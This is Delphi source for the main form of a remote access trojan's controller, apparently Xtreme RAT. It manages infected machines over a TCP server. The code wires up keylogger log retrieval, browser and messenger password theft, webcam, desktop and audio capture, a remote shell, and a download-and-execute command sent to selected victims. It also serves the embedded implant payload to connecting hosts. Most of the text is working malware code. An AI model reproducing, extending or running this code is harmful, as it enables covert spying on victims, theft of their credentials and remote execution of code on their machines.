unit UnitMain;
{$I Compilar.inc}
interface

uses
  StrUtils,Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, VirtualTrees, Menus, ComCtrls, jpeg, pngimage, ImgList,
  IdContext, IdScheduler, IdSchedulerOfThread, IdSchedulerOfThreadDefault,
  IdAntiFreezeBase, IdAntiFreeze, IdBaseComponent, IdComponent,
  IdCustomTCPServer, IdTCPServer, IdGlobal, ExtCtrls, AppEvnts, sSkinManager,
  MSNPopup, StdCtrls, sScrollBox, sFrameBar, Buttons, sSpeedButton, AS_ShellUtils, UnitConexao,
  sSplitter;

const
  WM_ATUALIZARIDIOMA = WM_USER + 8989;
  WM_CLOSEFREE = WM_USER + 8990;
  WM_RARPLUGINOK = WM_USER + 8991;

type
  TFormMain = class(TForm)
    StatusBar1: TStatusBar;
    MainMenu1: TMainMenu;
    Arquivo1: TMenuItem;
    Sair1: TMenuItem;
    MainList: TVirtualStringTree;
    Flags16: TImageList;
    Flags24: TImageList;
    Flags32: TImageList;
    PopupMenuColumns: TPopupMenu;
    PopupMenuFunctions: TPopupMenu;
    Ping1: TMenuItem;
    N1: TMenuItem;
    Criarservidor1: TMenuItem;
    Idiomas1: TMenuItem;
    Opes1: TMenuItem;
    Conexo1: TMenuItem;
    DesktopImageList: TImageList;
    IdTCPServer1: TIdTCPServer;
    IdAntiFreeze1: TIdAntiFreeze;
    IdSchedulerOfThreadDefault1: TIdSchedulerOfThreadDefault;
    Timer1: TTimer;
    Desinstalar1: TMenuItem;
    PopupMenuTraycon: TPopupMenu;
    Restaurar1: TMenuItem;
    N2: TMenuItem;
    Sair2: TMenuItem;
    TrayIcon1: TTrayIcon;
    ApplicationEvents1: TApplicationEvents;
    sSkinManager1: TsSkinManager;
    Skins1: TMenuItem;
    Configuraes1: TMenuItem;
    N3: TMenuItem;
    Thumbs1: TMenuItem;
    Reconectar1: TMenuItem;
    Opesdoservidor1: TMenuItem;
    Mudardegrupo1: TMenuItem;
    Renomear1: TMenuItem;
    Atualizarservidor1: TMenuItem;
    Arquivolocal1: TMenuItem;
    OpenDialog1: TOpenDialog;
    Modificarconfiguraes1: TMenuItem;
    Linkhttp1: TMenuItem;
    Executarcomandos1: TMenuItem;
    Baixareexecutar1: TMenuItem;
    Abrirpginadainternet1: TMenuItem;
    Enviararquivoseexecutar1: TMenuItem;
    Abrirpastadedownloads1: TMenuItem;
    Funes1: TMenuItem;
    Gerenciadordeprocessos1: TMenuItem;
    Gerenciadordejanelas1: TMenuItem;
    Gerenciadordeservios1: TMenuItem;
    Gerenciadorderegistros1: TMenuItem;
    Prompt1: TMenuItem;
    Gerenciadordearquivos1: TMenuItem;
    N5: TMenuItem;
    Gerenciadordeclipboard1: TMenuItem;
    Listardispositivos1: TMenuItem;
    Portasativas1: TMenuItem;
    Programasinstalados1: TMenuItem;
    Diversos1: TMenuItem;
    Capturardesktop1: TMenuItem;
    Capturarwebcam1: TMenuItem;
    Capturarudio1: TMenuItem;
    CHAT1: TMenuItem;
    Keylogger1: TMenuItem;
    Passwords1: TMenuItem;
    Procurarpalavrasnokeylogger1: TMenuItem;
    Procurararquivos1: TMenuItem;
    Configuraesdoservidor1: TMenuItem;
    Proxy1: TMenuItem;
    Iniciar1: TMenuItem;
    Parar1: TMenuItem;
    MSN1: TMenuItem;
    Desativar1: TMenuItem;
    Reiniciar1: TMenuItem;
    sFrameBar1: TsFrameBar;
    BarSpeedButton: TsSpeedButton;
    ListView1: TListView;
    Image1: TImage;
    Abrirpastadeimagens1: TMenuItem;
    Desktop1: TMenuItem;
    Webcam1: TMenuItem;
    AtualizaodeIP1: TMenuItem;
    DynDNS1: TMenuItem;
    NoIP1: TMenuItem;
    Controlcenter1: TMenuItem;
    ImageListDiversos: TImageList;
    Contatos1: TMenuItem;
    PopupMenuinfo: TPopupMenu;
    Copiar1: TMenuItem;
    Splitter1: TsSplitter;
    JanelasAlwasOnTop1: TMenuItem;
    Keylogger2: TMenuItem;
    Baixarlogsdokeylogger1: TMenuItem;
    Registrosdeconexes1: TMenuItem;
    Habilitar1: TMenuItem;
    N4: TMenuItem;
    Selecionar1: TMenuItem;
    SelectNotifyImage1: TMenuItem;
    Timer2: TTimer;
    procedure MainListAddToSelection(Sender: TBaseVirtualTree;
      Node: PVirtualNode);
    procedure MainListGetPopupMenu(Sender: TBaseVirtualTree; Node: PVirtualNode;
      Column: TColumnIndex; const P: TPoint; var AskParent: Boolean;
      var PopupMenu: TPopupMenu);
    procedure MainListHeaderClick(Sender: TVTHeader; HitInfo: TVTHeaderHitInfo);
    procedure MainListPaintText(Sender: TBaseVirtualTree;
      const TargetCanvas: TCanvas; Node: PVirtualNode; Column: TColumnIndex;
      TextType: TVSTTextType);
    procedure MainListGetNodeDataSize(Sender: TBaseVirtualTree;
      var NodeDataSize: Integer);
    procedure MainListGetText(Sender: TBaseVirtualTree; Node: PVirtualNode;
      Column: TColumnIndex; TextType: TVSTTextType; var CellText: string);
    procedure MainListGetImageIndex(Sender: TBaseVirtualTree;
      Node: PVirtualNode; Kind: TVTImageKind; Column: TColumnIndex;
      var Ghosted: Boolean; var ImageIndex: Integer);
    procedure MainListMeasureItem(Sender: TBaseVirtualTree;
      TargetCanvas: TCanvas; Node: PVirtualNode; var NodeHeight: Integer);
    procedure MainListCompareNodes(Sender: TBaseVirtualTree; Node1,
      Node2: PVirtualNode; Column: TColumnIndex; var Result: Integer);
    procedure MainListMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure MainListDblClick(Sender: TObject);
    procedure Controlcenter1Click(Sender: TObject);

    procedure IdTCPServer1Connect(AContext: TIdContext);
    procedure IdTCPServer1Exception(AContext: TIdContext;
      AException: Exception);
    procedure IdTCPServer1Execute(AContext: TIdContext);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure Thumbs1Click(Sender: TObject);
    procedure ListView1AdvancedCustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; Stage: TCustomDrawStage;
      var DefaultDraw: Boolean);
    procedure ApplicationEvents1Message(var Msg: tagMSG; var Handled: Boolean);
    procedure ApplicationEvents1Minimize(Sender: TObject);
    procedure Criarservidor1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure IdTCPServer1Disconnect(AContext: TIdContext);
    procedure Ping1Click(Sender: TObject);
    procedure Sair1Click(Sender: TObject);
    procedure Sair2Click(Sender: TObject);
    procedure PopupMenuColumnsPopup(Sender: TObject);
    procedure PopupMenuFunctionsPopup(Sender: TObject);
    procedure PopupMenuinfoPopup(Sender: TObject);
    procedure Conexo1Click(Sender: TObject);
    procedure TrayIcon1DblClick(Sender: TObject);
    procedure Restaurar1Click(Sender: TObject);
    procedure StatusBar1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure StatusBar1MouseLeave(Sender: TObject);
    procedure StatusBar1Click(Sender: TObject);
    procedure Configuraes1Click(Sender: TObject);
    procedure DynDNS1Click(Sender: TObject);
    procedure NoIP1Click(Sender: TObject);
    procedure Contatos1Click(Sender: TObject);
    procedure Desinstalar1Click(Sender: TObject);
    procedure Reconectar1Click(Sender: TObject);
    procedure Renomear1Click(Sender: TObject);
    procedure Reiniciar1Click(Sender: TObject);
    procedure Mudardegrupo1Click(Sender: TObject);
    procedure Modificarconfiguraes1Click(Sender: TObject);
    procedure Abrirpginadainternet1Click(Sender: TObject);
    procedure Abrirpastadedownloads1Click(Sender: TObject);
    procedure Baixareexecutar1Click(Sender: TObject);
    procedure BarSpeedButtonClick(Sender: TObject);
    procedure Configuraesdoservidor1Click(Sender: TObject);
    procedure Desativar1Click(Sender: TObject);
    procedure Arquivolocal1Click(Sender: TObject);
    procedure Linkhttp1Click(Sender: TObject);
    procedure Executarcomandos1Click(Sender: TObject);
    procedure Enviararquivoseexecutar1Click(Sender: TObject);
    procedure Passwords1Click(Sender: TObject);
    procedure Iniciar1Click(Sender: TObject);
    procedure Parar1Click(Sender: TObject);
    procedure Desktop1Click(Sender: TObject);
    procedure Webcam1Click(Sender: TObject);
    procedure Gerenciadordeprocessos1Click(Sender: TObject);
    procedure Gerenciadordearquivos1Click(Sender: TObject);
    procedure Procurararquivos1Click(Sender: TObject);
    procedure Keylogger1Click(Sender: TObject);
    procedure Procurarpalavrasnokeylogger1Click(Sender: TObject);
    procedure Copiar1Click(Sender: TObject);
    procedure Gerenciadordejanelas1Click(Sender: TObject);
    procedure Gerenciadordeservios1Click(Sender: TObject);
    procedure Gerenciadorderegistros1Click(Sender: TObject);
    procedure Gerenciadordeclipboard1Click(Sender: TObject);
    procedure Programasinstalados1Click(Sender: TObject);
    procedure Listardispositivos1Click(Sender: TObject);
    procedure Capturardesktop1Click(Sender: TObject);
    procedure Capturarwebcam1Click(Sender: TObject);
    procedure Capturarudio1Click(Sender: TObject);
    procedure Portasativas1Click(Sender: TObject);
    procedure Prompt1Click(Sender: TObject);
    procedure Diversos1Click(Sender: TObject);
    procedure CHAT1Click(Sender: TObject);
    procedure MSN1Click(Sender: TObject);
    procedure Splitter1Moved(Sender: TObject);
    procedure MainListInitNode(Sender: TBaseVirtualTree; ParentNode,
      Node: PVirtualNode; var InitialStates: TVirtualNodeInitStates);
    procedure JanelasAlwasOnTop1Click(Sender: TObject);
    procedure TrayIcon1BalloonClick(Sender: TObject);
    procedure Keylogger2Click(Sender: TObject);
    procedure Baixarlogsdokeylogger1Click(Sender: TObject);
    procedure Registrosdeconexes1Click(Sender: TObject);
    procedure Habilitar1Click(Sender: TObject);
    procedure Selecionar1Click(Sender: TObject);
    procedure SelectNotifyImage1Click(Sender: TObject);
    procedure MainListNodeDblClick(Sender: TBaseVirtualTree;
      const HitInfo: THitInfo);
    procedure Timer2Timer(Sender: TObject);
  private
    { Private declarations }
    MaxConnectionHttp: integer;
    PossoMostrar: boolean;
    ShowInfoPanel: boolean;
    MainListPopup: TPopupMenu;
    IdiomasFilesDir: string;
    SettingsFile: string;
    LangFile: string;
    SkinName: string;
    SkinHUE, SkinSaturation: Integer;
    SoundFile: string;
    PortList: string;
    ForcarSaida: boolean;
    MSN, ConnectionClossed: TMSNPopup;
      DynDNSHost, DynDNSUser, DynDNSPass,
      NoIPHost, NoIPUser, NoIPPass: string;
    OldBitmapCount: integer;

    TempListViewLogs: TListView;

    Procedure ExecutarComando(Recebido: string; ConAux: TConexaoNew);
    function GetNodeGroup(ConAux: TConexaoNew): PVirtualNode;
    procedure OnShowHint(var HintStr: string; var CanShow: Boolean;
      var HintInfo: Controls.THintInfo);
    procedure OnException(Sender: TObject; E: Exception);
    procedure ConvertToHighColor(ImageList: TImageList);
    procedure ColunaClick(Sender: TObject);
    procedure ChangeImageList(ImageList: TImageList);
    procedure showFrameBar(AVisible: boolean);
    procedure IdiomaClick(Sender: TObject);
    procedure IdiomasListFileDir(Path: string);
    function GetAllNodes: TNodeArray;
    procedure AtualizarIdiomas;
    procedure AtualizarPopupMenu;
  public
    { Public declarations }
    UseUPnP: boolean;
    CloseToSysTray, MinimizeToSysTray, VNotify, SNotify, EnabledSkin,
      ShowDeskPreview, ShowThumbPreview, AutoDesktop, AutoWebcam,AutoOpenWebcam ,AutoAudio: boolean;
    ThumbSize, FlagSize, PingColor, MainColor,
    DesktopSize, ImageHeight, ImageWidth: integer;
    ConnLogsDir: string;
    MinDate: TDateTime;

    LastReconnectIP, LastGroupName, LastRenameName, LastUpdateLink, LastExecuteCommand,
      LastDownExec, LastOpenWeb, LastChatClient, LastChatServer, LastWindowTitle,
      LastKeySearch, LastFileSearch, LastProxyPort: string;

    SuperImageList: TImageList;
    ControlCenter: boolean;

    FileManagerIcon: array [0..10] of integer;
    FileManagerSpecialIcons: Array [0..35] of integer; // número de items no TRootSpecial
    FileManagerUnknownIcon: integer;
    FileManagerFolderIcon: integer;

    procedure CheckForms(ConAux: TConexaoNew; CloseFormAll: boolean = True; LiberarForm: boolean = False);
    procedure IdTCPServerConnectAlternative(AContext: TIdContext);
    procedure IdTCPServerExecuteAlternative(AContext: TIdContext);
    procedure AtualizarQuantidade;
    procedure DisconnectServers(AContext: TIdContext);
    procedure AbrirProcessos(ConAux: TConexaoNew);
    procedure AbrirFileManager(ConAux: TConexaoNew);
    procedure AbrirKeylogger(ConAux: TConexaoNew);
    procedure AbrirJanelas(ConAux: TConexaoNew);
    procedure AbrirServicos(ConAux: TConexaoNew);
    procedure AbrirRegistro(ConAux: TConexaoNew);
    procedure AbrirClipboard(ConAux: TConexaoNew);
    procedure AbrirProgramas(ConAux: TConexaoNew);
    procedure AbrirDispositivos(ConAux: TConexaoNew);
    procedure AbrirPortasAtivas(ConAux: TConexaoNew);
    procedure AbrirShell(ConAux: TConexaoNew);
    procedure AbrirDiversos(ConAux: TConexaoNew);
    procedure AbrirCHAT(ConAux: TConexaoNew);
    procedure AbrirMSN(ConAux: TConexaoNew);
  end;

type
  MaxN = 1 .. 59; // tamanho máximo da string; "chars"

function RandomString(QtdeChars: MaxN): string;
function GetFileSize(fname: string): int64;

type
  TSearchFilesDados = Class
    FileName: string;
  end;

const
  WM_MAININFO = WM_USER + 4000;
  WM_INSERTNODE = WM_USER + 4001;
  WM_DELETENODE = WM_USER + 4002;
  WM_STARTMAIN = WM_USER + 4003;
  WM_CHECK = WM_USER + 4004;
  WM_SENDALLSERVER = WM_USER + 4005;
  WM_SHOWDISCONNECT = WM_USER + 4006;
  WM_INSERTLIST = WM_USER + 4007;

function InputQuery(const ACaption, APrompt: string;
  var Value: string): Boolean;
procedure SaveComponentToStream(Stream: TStream; a: TComponent);
procedure LoadComponentFromStream(Stream: TStream; a: TComponent);


var
  FormMain: TFormMain;

implementation

{$R *.dfm}
uses
  ShellAPI,
  CommCtrl,
  CustomIniFiles,
  MMSystem,
  UnitStrings,
  UnitConstantes,
  UnitAll,
  UnitCreateServer,
  InformacoesServidor,
  UnitCommonProcedures,
  UnitDesktopPreview,
  UnitSelectPort,
  UnitSettings,
  UnitUpdateIP,
  UnitAbout,
  acSelectSkin,
  UnitUpdateSkin,
  UnitServerSettings,
  UnitPasswords,
  UnitProcessos,
  UnitFileManager,
  UnitFileSearch,
  UnitKeylogger,
  UnitKeySearch,
  UnitBandeiras,
  UnitCryptString,
  SQLiteTable3,
  sqlite3,
  UnitWindows,
  UnitServices,
  UnitRegedit,
  UnitClipboard,
  UnitProgramas,
  UnitListarDispositivos,
  UnitDesktop,
  UnitAudioCapture,
  UnitWebcam,
  UnitActivePorts,
  UnitShell,
  UnitDiversos,
  UnitChat,
  UnitChatSettings,
  UnitMSN,
  UnitCompressString,
  Sample,
  BTMemoryModule,
  UnitAlwaysOnTop,
  UnitConnectionsLog,
  DateUtils,
  MD5,
  IdSync;

var
  MemoryModule: PBTMemoryModule;
  AutoHidingEnabled : boolean = False;
  EnviandoPING: boolean = False;

const
  sOpenBar = '<'#13#10'<'#13#10'<'#13#10'<'#13#10'<'#13#10; // May be changed to glyphs
  sCloseBar = '>'#13#10'>'#13#10'>'#13#10'>'#13#10'>'#13#10;

function Today: string;
var
  d: TDateTime;
begin
  d := now;
  Result := Copy(DateTimeToStr(d), 1, posex(' ', DateTimeToStr(d) + ' ') - 1);
end;

function InputQuery(const ACaption, APrompt: string;
  var Value: string): Boolean;
  function GetAveCharSize(Canvas: TCanvas): TPoint;
  var
    I: Integer;
    Buffer: array[0..51] of Char;
  begin
    for I := 0 to 25 do Buffer[I] := Chr(I + Ord('A'));
    for I := 0 to 25 do Buffer[I + 26] := Chr(I + Ord('a'));
    GetTextExtentPoint(Canvas.Handle, Buffer, 52, TSize(Result));
    Result.X := Result.X div 52;
  end;

var
  Form: TForm;
  Prompt: TLabel;
  Edit: TEdit;
  DialogUnits: TPoint;
  ButtonTop, ButtonWidth, ButtonHeight: Integer;
  WasStayOnTop: boolean;
begin
  Result := False;
  Form := TForm.Create(Application);
  with Form do
    try
      FormStyle := fsStayOnTop;
      Canvas.Font := Font;
      DialogUnits := GetAveCharSize(Canvas);
      BorderStyle := bsDialog;
      Caption := ACaption;
      ClientWidth := MulDiv(180, DialogUnits.X, 4);
      PopupMode := pmAuto;
      Position := poScreenCenter;
      Prompt := TLabel.Create(Form);
      with Prompt do
      begin
        Parent := Form;
        Caption := APrompt;
        Left := MulDiv(8, DialogUnits.X, 4);
        Top := MulDiv(8, DialogUnits.Y, 8);
        Constraints.MaxWidth := MulDiv(164, DialogUnits.X, 4);
        WordWrap := True;
      end;
      Edit := TEdit.Create(Form);
      with Edit do
      begin
        Parent := Form;
        Left := Prompt.Left;
        Top := Prompt.Top + Prompt.Height + 5;
        Width := MulDiv(164, DialogUnits.X, 4);
        MaxLength := 255;
        Text := Value;
        SelectAll;
      end;
      ButtonTop := Edit.Top + Edit.Height + 15;
      ButtonWidth := MulDiv(50, DialogUnits.X, 4);
      ButtonHeight := MulDiv(14, DialogUnits.Y, 8);
      with TButton.Create(Form) do
      begin
        Parent := Form;
        Caption := 'OK';
        ModalResult := mrOk;
        Default := True;
        SetBounds(MulDiv(38, DialogUnits.X, 4), ButtonTop, ButtonWidth,
          ButtonHeight);
      end;
      with TButton.Create(Form) do
      begin
        Parent := Form;
        Caption := 'Cancel';
        ModalResult := mrCancel;
        Cancel := True;
        SetBounds(MulDiv(92, DialogUnits.X, 4), Edit.Top + Edit.Height + 15,
          ButtonWidth, ButtonHeight);
        Form.ClientHeight := Top + Height + 13;
      end;
      WasStayOnTop := Assigned(Application.MainForm) and (Application.MainForm.FormStyle = fsStayOnTop);
      if WasStayOnTop then Application.MainForm.FormStyle := fsNormal;
      try
        if ShowModal = mrOk then
        begin
          Value := Edit.Text;
          Result := True;
        end;
        finally if WasStayOnTop then Application.MainForm.FormStyle := fsStayOnTop;
      end;
    finally
      Form.Free;
    end;
end;

function MSecToTime(mSec: Int64): string;
var
  dt : TDateTime;
begin
   dt := mSec / MSecsPerSec / SecsPerDay;
   // a pedido de muitos usuários
   Result := Format('%d days, %s', [Trunc(dt), FormatDateTime('hh:nn:ss', Frac(dt))]);
   Result := replacestring('0 days, ', '', result);
end;

Procedure CriarArquivo(NomedoArquivo: pWideChar; Buffer: pWideChar; Size: int64);
var
  hFile: THandle;
  lpNumberOfBytesWritten: DWORD;
begin
  hFile := CreateFile(NomedoArquivo, GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);

  if hFile <> INVALID_HANDLE_VALUE then
  begin
    if Size = INVALID_HANDLE_VALUE then
    SetFilePointer(hFile, 0, nil, FILE_BEGIN);
    WriteFile(hFile, Buffer[0], Size, lpNumberOfBytesWritten, nil);
  end;

  CloseHandle(hFile);
end;

function MyTempFolder: String;
var
  lpBuffer: array of WideChar;
begin
  SetLength(lpBuffer, MAX_PATH * 2);
  GetTempPath(MAX_PATH, pWideChar(lpBuffer));
  Result := pWideChar(lpBuffer);
end;

function GetPassImage(Str: string): integer;
begin
  result := - 1;
  if Str = 'IE' then result := 72 else
  if Str = 'FF' then result := 71 else
  if Str = 'NOIP' then result := 70 else
  if Str = 'MSN' then result := 73 else
  if Str = 'CHROME' then result := 107 else
  if Str = 'WIRELESS' then result := 101 else
  if Str = 'OPERA' then result := 117 else
  if Str = 'MIRANDA' then result := 118 else
  if Str = 'GTALK' then result := 119 else
  if Str = 'SAFARI' then result := 120;
end;

function LerArquivo(FileName: pWideChar; var p: pointer): Int64;
var
  hFile: Cardinal;
  lpNumberOfBytesRead: DWORD;
begin
  result := 0;
  p := nil;
  if fileexists(filename) = false then exit;

  hFile := CreateFile(FileName, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  result := windows.GetFileSize(hFile, nil);
  GetMem(p, result);
  ReadFile(hFile, p^, result, lpNumberOfBytesRead, nil);
  CloseHandle(hFile);
end;

function GetFileSize(fname: string): int64;
var
  myfile: TFileStream;
begin
  result := 0;
  if FileExists(fname) = false then exit;
  myFile := TFileStream.Create(fname, fmOpenRead + fmShareDenyNone);
  try
    result := myFile.Size;
    finally
    myFile.free;
  end;
end;

function RandomString(QtdeChars: MaxN): string;
const
  Chars =
    '0123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijklmnopqrstuwxyz';
var
  S: string;
  i, N: integer;
begin
  Randomize;
  sleep(random(99));
  S := '';
  for i := 1 to QtdeChars do
  begin
    repeat
      N := Random(Length(Chars)) + 1;
    until posex(Chars[N], S) <= 0;
    S := S + Chars[N];
  end;
  Result := S;
end;

procedure SetClipboardText(Const S: widestring);
var
  Data: THandle;
  DataPtr: Pointer;
  Size: integer;
begin
  Size := length(S);
  OpenClipboard(0);
  try
    Data := GlobalAlloc(GMEM_MOVEABLE + GMEM_DDESHARE, (Size * 2) + 2);
    try
      DataPtr := GlobalLock(Data);
      try
        Move(S[1], DataPtr^, Size * 2);
        SetClipboardData(CF_UNICODETEXT{CF_TEXT}, Data);
      finally
        GlobalUnlock(Data);
      end;
    except
      GlobalFree(Data);
      raise;
    end;
  finally
    CloseClipboard;
  end;
end;

procedure TFormMain.AtualizarQuantidade;
var
  i: integer;
  Node: pVirtualNode;
begin
  i := 0;
  Node := MainList.GetFirst;
  while Assigned(Node) do
  begin
    if (MainList.IsVisible[Node] = True) and (MainList.GetNodeLevel(node) = 0) then i := i + MainList.ChildCount[Node];
    Node := MainList.GetNext(Node);
  end;

  StatusBar1.Panels.Items[1].Text := Traduzidos[25] + ': ' + IntToStr(i);
  Caption := NomeDoPrograma + ' ' + VersaoDoPrograma + ' [' + Traduzidos[25] + ' (' + IntToStr(i) + ')]';
end;

procedure TFormMain.Baixareexecutar1Click(Sender: TObject);
var
  i: integer;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  Name: string;
begin
  application.ProcessMessages;
  name := LastDownExec;
  if inputquery(pwidechar(traduzidos[179]), pwidechar(traduzidos[180]), name) = false then exit;
  LastDownExec := Name;

  Node := MainList.GetFirstSelected;
  while Assigned(Node) do
  begin
    ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
    if (ConAux <> nil) and (Node.ChildCount <= 0) and (vsSelected in Node.States) then
    begin
      ConAux.EnviarString(DOWNEXEC + DelimitadorComandos + LastDownExec);
    end;
    Node := MainList.GetNextSelected(Node);
  end;
end;

procedure TFormMain.Baixarlogsdokeylogger1Click(Sender: TObject);
var
  i: integer;
  Node: pVirtualNode;
  ConAux: TConexaoNew;
begin
  application.ProcessMessages;
  Node := MainList.GetFirstSelected;
  while Assigned(Node) do
  begin
    ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
    if (ConAux <> nil) and (Node.ChildCount <= 0) and (vsSelected in Node.States) then
    begin
      ConAux.EnviarString(ENVIARLOGSKEY + '|');
    end;
    Node := MainList.GetNextSelected(Node);
  end;
end;

procedure TFormMain.BarSpeedButtonClick(Sender: TObject);
begin
  ShowFrameBar(not sFrameBar1.Visible);
end;

procedure TFormMain.IdTCPServer1Connect(AContext: TIdContext);
var
  TempStr: string;
  ConAux: TConexaoNew;
  resStream: TResourceStream;
  ServerBuffer: string;
  Bytes: TidBytes;
  i: integer;
begin
  ConAux := TConexaoNew(AContext);
  TempStr := '';

  AContext.Connection.Socket.UseNagle := False;
  with AContext.Connection.IOHandler do
  try
    CheckForDataOnSource(10);
   try TempStr := ReadLn except TempStr := '' end;
    except
  end;

  if posex(IntToStr(ConnectionPass) + '.functions', TempStr) > 0 then
  begin
    if MaxConnectionHttp >= 5 then
    begin
      AContext.Connection.Disconnect;
      exit;
    end;
    MaxConnectionHttp := MaxConnectionHttp + 1;

    while Acontext.Connection.IOHandler.ReadLn <> '' do
    begin
      sleep(10);
      Application.ProcessMessages;
    end;

    resStream := TResourceStream.Create(hInstance, 'SERVER', 'serverfile');
    SetLength(ServerBuffer, resStream.Size div 2);
    resStream.Position := 0;
    resStream.Read(ServerBuffer[1], resStream.Size);
    resStream.Free;

    // Se quiser enviar desencriptado...
    //EnDecryptStrRC4B(@ServerBuffer[1], Length(ServerBuffer) * 2, 'XTREME');
    ServerBuffer := ServerBuffer + 'ENDSERVERBUFFER';
    Bytes := RawToBytes(ServerBuffer[1], Length(ServerBuffer) * 2);

    AContext.Connection.IOHandler.Write(Bytes, Length(ServerBuffer) * 2);
    AContext.Connection.Disconnect;

    MaxConnectionHttp := MaxConnectionHttp - 1;
  end else if posex(MYVERSION, TempStr) > 0 then
  begin
    Randomize;
    TempStr := RandomString(high(MaxN));

    ConAux.MasterIdentification := 1234567890;
    ConAux.AContext := TConexaoNew(AContext);
    ConAux.FontColor := MainColor;
    ConAux.Porta := IntToStr(AContext.Connection.Socket.Binding.Port);
    ConAux.Node := nil;
    ConAux.BrotherID := '';
    ConAux.ConnectionID := TempStr ;
    ConAux.Connection.IOHandler.DefStringEncoding := IndyTextEncoding_UTF8;
    ConAux.EnviarString(MAININFO + DelimitadorComandos + ConAux.ConnectionID);
    ConAux.ValidConnection := False;
    PostMessage(FormMain.Handle, WM_CHECK, 0, integer(ConAux));
    Application.ProcessMessages;
  end else AContext.Connection.Disconnect;
end;

procedure TFormMain.IdTCPServer1Disconnect(AContext: TIdContext);
begin
  DisconnectServers(AContext);
end;

procedure TFormMain.IdTCPServer1Exception(AContext: TIdContext;
  AException: Exception);
begin
  AException := nil;
  AContext.Connection.IOHandler.CloseGracefully;
  EnviandoPING := False;
end;

procedure TFormMain.IdTCPServer1Execute(AContext: TIdContext);
var
  ConAux: TConexaoNew;
  TempStr: string;
begin
  TempStr := '';

  ConAux := TConexaoNew(AContext);
  sleep(5);
  Application.ProcessMessages;

  if AContext.Connection.IOHandler.InputBufferIsEmpty then
  begin
    AContext.Connection.IOHandler.CheckForDataOnSource(10);
    if AContext.Connection.IOHandler.InputBufferIsEmpty then Exit;
  end;

  TempStr := ConAux.ReceberString;

  if TempStr = 'InvalidConnection' then
  begin
    AContext.Connection.Disconnect;
    Exit;
  end else
  begin
    if ConAux.ValidConnection = False then ConAux.ValidConnection := True;
    ExecutarComando(TempStr, ConAux);
  end;
end;

procedure TFormMain.CheckForms(ConAux: TConexaoNew; CloseFormAll: boolean = True; LiberarForm: boolean = False);
var
  Comando: Cardinal;
begin
  if LiberarForm then Comando := WM_CLOSEFREE else Comando := WM_CLOSE;

  //Fechar forms...
  if ConAux.FormProcessos <> nil then
  if TFormProcessos(ConAux.FormProcessos).Visible then PostMessage(TFormProcessos(ConAux.FormProcessos).Handle, Comando, 0, 0);

  if ConAux.FormWindows <> nil then
  if TFormWindows(ConAux.FormWindows).Visible then PostMessage(TFormWindows(ConAux.FormWindows).Handle, Comando, 0, 0);

  if ConAux.FormServices <> nil then
  if TFormServices(ConAux.FormServices).Visible then PostMessage(TFormServices(ConAux.FormServices).Handle, Comando, 0, 0);

  if ConAux.FormRegedit <> nil then
  if TFormRegedit(ConAux.FormRegedit).Visible then PostMessage(TFormRegedit(ConAux.FormRegedit).Handle, Comando, 0, 0);

  if ConAux.FormShell <> nil then
  if TFormShell(ConAux.FormShell).Visible then PostMessage(TFormShell(ConAux.FormShell).Handle, Comando, 0, 0);

  if ConAux.FormFileManager <> nil then
  if TFormFileManager(ConAux.FormFileManager).Visible then PostMessage(TFormFileManager(ConAux.FormFileManager).Handle, Comando, 0, 0);

  if ConAux.FormClipboard <> nil then
  if TFormClipboard(ConAux.FormClipboard).Visible then PostMessage(TFormClipboard(ConAux.FormClipboard).Handle, Comando, 0, 0);

  if ConAux.FormListarDispositivos <> nil then
  if TFormListarDispositivos(ConAux.FormListarDispositivos).Visible then PostMessage(TFormListarDispositivos(ConAux.FormListarDispositivos).Handle, Comando, 0, 0);

  if ConAux.FormActivePorts <> nil then
  if TFormActivePorts(ConAux.FormActivePorts).Visible then PostMessage(TFormActivePorts(ConAux.FormActivePorts).Handle, Comando, 0, 0);

  if ConAux.FormProgramas <> nil then
  if TFormProgramas(ConAux.FormProgramas).Visible then PostMessage(TFormProgramas(ConAux.FormProgramas).Handle, Comando, 0, 0);

  if ConAux.FormDiversos <> nil then
  if TFormDiversos(ConAux.FormDiversos).Visible then PostMessage(TFormDiversos(ConAux.FormDiversos).Handle, Comando, 0, 0);

  if ConAux.FormCHAT <> nil then
  if TFormCHAT(ConAux.FormCHAT).Visible then PostMessage(TFormCHAT(ConAux.FormCHAT).Handle, Comando, 0, 0);

  if ConAux.FormKeylogger <> nil then
  if TFormKeylogger(ConAux.FormKeylogger).Visible then PostMessage(TFormKeylogger(ConAux.FormKeylogger).Handle, Comando, 0, 0);

  if ConAux.FormServerSettings <> nil then
  if TFormServerSettings(ConAux.FormServerSettings).Visible then PostMessage(TFormServerSettings(ConAux.FormServerSettings).Handle, Comando, 0, 0);

  if ConAux.FormMSN <> nil then
  if TFormMSN(ConAux.FormMSN).Visible then PostMessage(TFormMSN(ConAux.FormMSN).Handle, Comando, 0, 0);












  if CloseFormAll = True then
  begin
    if ConAux.FormDesktop <> nil then
    if TFormDesktop(ConAux.FormDesktop).Visible then PostMessage(TFormDesktop(ConAux.FormDesktop).Handle, Comando, 0, 0);

    if ConAux.FormWebcam <> nil then
    if TFormWebcam(ConAux.FormWebcam).Visible then PostMessage(TFormWebcam(ConAux.FormWebcam).Handle, Comando, 0, 0);

    if ConAux.FormAudioCapture <> nil then
    if TFormAudioCapture(ConAux.FormAudioCapture).Visible then PostMessage(TFormAudioCapture(ConAux.FormAudioCapture).Handle, Comando, 0, 0);

    //Sempre na última posição...
    if ConAux.FormAll <> nil then
    if TFormAll(ConAux.FormAll).Visible then PostMessage(TFormAll(ConAux.FormAll).Handle, Comando, 0, 0);
  end;
  Application.ProcessMessages;
end;

